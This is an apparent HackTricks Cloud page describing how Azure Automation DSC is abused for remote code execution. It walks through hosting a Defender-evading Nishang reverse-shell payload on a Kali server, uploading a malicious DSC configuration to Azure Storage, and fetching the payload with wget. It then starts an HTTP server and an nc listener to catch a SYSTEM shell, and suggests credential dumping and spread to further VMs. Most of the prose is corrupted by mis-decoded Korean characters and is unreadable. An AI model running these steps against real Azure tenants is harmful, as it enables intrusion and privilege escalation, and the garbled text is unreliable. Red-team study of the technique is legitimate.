# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

ì´ ê³¼ì •ì€ Windows Defenderë¥¼ ìš°íšŒí•˜ë„ë¡ ì„¤ê³„ëœ ìˆ˜ì •ëœ Nishang `Invoke-PowerShellTcp.ps1` í˜ì´ë¡œë“œì¸ `RevPS.ps1`ë¥¼ í˜¸ìŠ¤íŒ…í•˜ê¸° ìœ„í•œ ì›ê²© ì„œë²„ ì¸í”„ë¼ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œëŠ” IP `40.84.7.74`ë¥¼ ê°€ì§„ Kali Linux ë¨¸ì‹ ì—ì„œ ê°„ë‹¨í•œ Python HTTP ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œê³µë©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ ì—¬ëŸ¬ ë‹¨ê³„ë¥¼ í†µí•´ ì‹¤í–‰ë©ë‹ˆë‹¤:

#### Step 1 â€” Create Files

* **Files Required:** ë‘ ê°œì˜ PowerShell ìŠ¤í¬ë¦½íŠ¸ê°€ í•„ìš”í•©ë‹ˆë‹¤:
1. `reverse_shell_config.ps1`: í˜ì´ë¡œë“œë¥¼ ê°€ì ¸ì™€ ì‹¤í–‰í•˜ëŠ” Desired State Configuration (DSC) íŒŒì¼ì…ë‹ˆë‹¤. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)ì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. `push_reverse_shell_config.ps1`: VMì— êµ¬ì„±ì„ ê²Œì‹œí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¡œ, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Customization:** ì´ íŒŒì¼ì˜ ë³€ìˆ˜ì™€ ë§¤ê°œë³€ìˆ˜ëŠ” ë¦¬ì†ŒìŠ¤ ì´ë¦„, íŒŒì¼ ê²½ë¡œ ë° ì„œë²„/í˜ì´ë¡œë“œ ì‹ë³„ìë¥¼ í¬í•¨í•˜ì—¬ ì‚¬ìš©ìì˜ íŠ¹ì • í™˜ê²½ì— ë§ê²Œ ì¡°ì •í•´ì•¼ í•©ë‹ˆë‹¤.

#### Step 2 â€” Zip Configuration File

* `reverse_shell_config.ps1`ëŠ” Azure Storage Accountë¡œ ì „ì†¡í•  ì¤€ë¹„ê°€ ë˜ë„ë¡ `.zip` íŒŒì¼ë¡œ ì••ì¶•ë©ë‹ˆë‹¤.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 â€” Storage Context ì„¤ì • ë° ì—…ë¡œë“œ

* ì••ì¶•ëœ êµ¬ì„± íŒŒì¼ì€ Azureì˜ Set-AzStorageBlobContent cmdletì„ ì‚¬ìš©í•˜ì—¬ ë¯¸ë¦¬ ì •ì˜ëœ Azure Storage ì»¨í…Œì´ë„ˆì¸ azure-pentestì— ì—…ë¡œë“œë©ë‹ˆë‹¤.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 â€” Prep Kali Box

* Kali ì„œë²„ëŠ” GitHub ë¦¬í¬ì§€í† ë¦¬ì—ì„œ RevPS.ps1 í˜ì´ë¡œë“œë¥¼ ë‹¤ìš´ë¡œë“œí•©ë‹ˆë‹¤.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆ˜ì •ë˜ì–´ ëŒ€ìƒ Windows VMê³¼ ë¦¬ë²„ìŠ¤ ì…¸ì„ ìœ„í•œ í¬íŠ¸ë¥¼ ì§€ì •í•©ë‹ˆë‹¤.

#### Step 5 â€” êµ¬ì„± íŒŒì¼ ê²Œì‹œ

* êµ¬ì„± íŒŒì¼ì´ ì‹¤í–‰ë˜ì–´ ë¦¬ë²„ìŠ¤ ì…¸ ìŠ¤í¬ë¦½íŠ¸ê°€ Windows VMì˜ ì§€ì •ëœ ìœ„ì¹˜ì— ë°°í¬ë©ë‹ˆë‹¤.

#### Step 6 â€” í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ… ë° ë¦¬ìŠ¤ë„ˆ ì„¤ì •

* í˜ì´ë¡œë“œë¥¼ í˜¸ìŠ¤íŒ…í•˜ê¸° ìœ„í•´ Python SimpleHTTPServerê°€ ì‹œì‘ë˜ê³ , ìˆ˜ì‹  ì—°ê²°ì„ ìº¡ì²˜í•˜ê¸° ìœ„í•´ Netcat ë¦¬ìŠ¤ë„ˆê°€ ì„¤ì •ë©ë‹ˆë‹¤.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* ì˜ˆì•½ëœ ì‘ì—…ì´ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ì—¬ SYSTEM ìˆ˜ì¤€ì˜ ê¶Œí•œì„ ë‹¬ì„±í•©ë‹ˆë‹¤.

#### ê²°ë¡ 

ì´ í”„ë¡œì„¸ìŠ¤ì˜ ì„±ê³µì ì¸ ì‹¤í–‰ì€ ìê²© ì¦ëª… ë¤í”„ ë˜ëŠ” ì—¬ëŸ¬ VMìœ¼ë¡œ ê³µê²©ì„ í™•ì¥í•˜ëŠ” ë“± ì¶”ê°€ ì‘ì—…ì„ ìœ„í•œ ìˆ˜ë§ì€ ê°€ëŠ¥ì„±ì„ ì—´ì–´ì¤ë‹ˆë‹¤. ì´ ê°€ì´ë“œëŠ” Azure Automation DSC ì˜ì—­ì—ì„œ ì§€ì†ì ì¸ í•™ìŠµê³¼ ì°½ì˜ì„±ì„ ì¥ë ¤í•©ë‹ˆë‹¤.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
